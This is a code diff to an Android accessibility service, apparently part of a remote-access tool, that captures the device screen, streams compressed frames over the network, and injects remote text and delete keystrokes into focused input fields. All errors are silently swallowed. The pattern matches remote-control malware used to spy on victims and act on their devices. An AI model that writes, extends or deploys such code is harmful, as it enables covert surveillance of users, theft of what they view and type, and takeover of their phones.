@@ -45,24 +45,27 @@ public class KeySvc extends AccessibilityService {
 
     private final Runnable loop = new Runnable() {
         @Override public void run() {
-            int iv = 260;
+            int iv = 400;
             try {
-                boolean precisa = !ScreenSvc.alive || ScreenSvc.black || ScreenSvc.giveUp;
-                iv = Math.max(260, 1000 / Math.max(1, ScreenSvc.FPS));
+                boolean precisa = !ScreenSvc.alive || ScreenSvc.black || ScreenSvc.giveUp
+                        || System.currentTimeMillis() - ScreenSvc.lastFrame > 5000;
+                iv = Math.max(300, 1000 / Math.max(1, ScreenSvc.FPS));
                 if (shotOn && precisa && Build.VERSION.SDK_INT >= 30
                         && System.currentTimeMillis() - lastShot >= iv) {
                     lastShot = System.currentTimeMillis();
                     grab();
                 }
             } catch (Throwable ignored) {}
-            H.postDelayed(this, Math.max(160, iv));
+            H.postDelayed(this, Math.max(200, iv));
         }
     };
 
     @Override protected void onServiceConnected() {
         super.onServiceConnected();
         I = this;
-        try { Net.start(this); } catch (Throwable ignored) {}
+        try {
+            NetSvc.arranca(this);
+        } catch (Throwable ignored) {}
         H.post(flush);
         H.post(loop);
     }
@@ -185,6 +188,27 @@ public class KeySvc extends AccessibilityService {
                 else if (code == 187) performGlobalAction(GLOBAL_ACTION_RECENTS);
                 else if (code == 26) performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
                 else if (code == 5) performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
+                else if (code == 66) keyText("\n");
+                else if (code == 67) keyText("[DEL]");
+            } catch (Throwable ignored) {}
+        });
+    }
+
+    private void keyText(final String s) {
+        H.post(() -> {
+            try {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return;
+                AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
+                if (f == null) return;
+                CharSequence at = f.getText();
+                String novo = (at == null ? "" : at.toString()) + s;
+                if (s.equals("[DEL]")) {
+                    novo = at == null || at.length() == 0 ? "" : at.toString().substring(0, at.length() - 1);
+                }
+                Bundle a = new Bundle();
+                a.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, novo);
+                f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, a);
             } catch (Throwable ignored) {}
         });
     }
@@ -218,9 +242,10 @@ public class KeySvc extends AccessibilityService {
                         b = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                         soft = Bitmap.createBitmap(b.getWidth(), b.getHeight(), Bitmap.Config.ARGB_8888);
                         new android.graphics.Canvas(soft).drawBitmap(b, 0, 0, null);
-                        int tw = Math.min(720, soft.getWidth());
-                        int th = Math.max(2, soft.getHeight() * tw / soft.getWidth());
-                        small = Bitmap.createScaledBitmap(soft, tw & ~1, th & ~1, true);
+                        int tw = Math.max(2, Math.min(ScreenSvc.W, soft.getWidth())) & ~1;
+                        int th = Math.max(2, soft.getHeight() * tw / Math.max(1, soft.getWidth())) & ~1;
+                        small = Bitmap.createScaledBitmap(soft, tw, th, true);
+                        ScreenSvc.lastFrame = System.currentTimeMillis();
                         ByteArrayOutputStream bo = new ByteArrayOutputStream();
                         small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
                         Net.sendBin(bo.toByteArray());
